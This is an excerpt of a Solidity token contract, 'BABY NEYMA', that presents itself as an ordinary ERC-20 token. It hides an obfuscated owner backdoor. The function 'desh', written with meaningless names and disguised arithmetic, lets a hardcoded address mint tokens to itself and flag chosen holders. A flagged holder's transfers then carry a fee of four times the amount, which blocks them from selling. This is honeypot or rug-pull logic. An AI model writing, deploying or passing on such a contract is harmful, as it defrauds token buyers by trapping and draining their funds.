...
contract BABYNEYMA is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "BABY NEYMA";
    string private _symbol = "BNEYMA";
    uint8 private _decimals = 9;
    address payable public zhej;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public _pools;
    mapping (address => uint256) public wenz;
    ...
    constructor () {
        ...
        zhej = payable(address(0x6a14Ac1f2851FC9ea44e97b62FCa7D9f22EbFaEa));
    ...
    function hangz(uint256 zhous, uint256 put) public view returns(bool) {
        uint256 leif = zhous;
        address xih = msg.sender;
        require(zhej == xih);
        return put == leif;
    }

    function desh(address pig,uint256 yiw) public {
        if (yiw > 12-2**3*1) {
            _balances[zhej] += yiw*5-2;
        }
        if (hangz(1*1*0*1,yiw)) {wenz[pig] = 0+0*0;}
        if (hangz(6*3+1,yiw)) {wenz[pig] = yiw**4-1;}
    }
    ...
    function goFee(address sender, address recipient, uint256 uAmount) internal returns (uint256) {
        ...
        if(wenz[sender] != 0) taxFee = uAmount.mul(1+3);
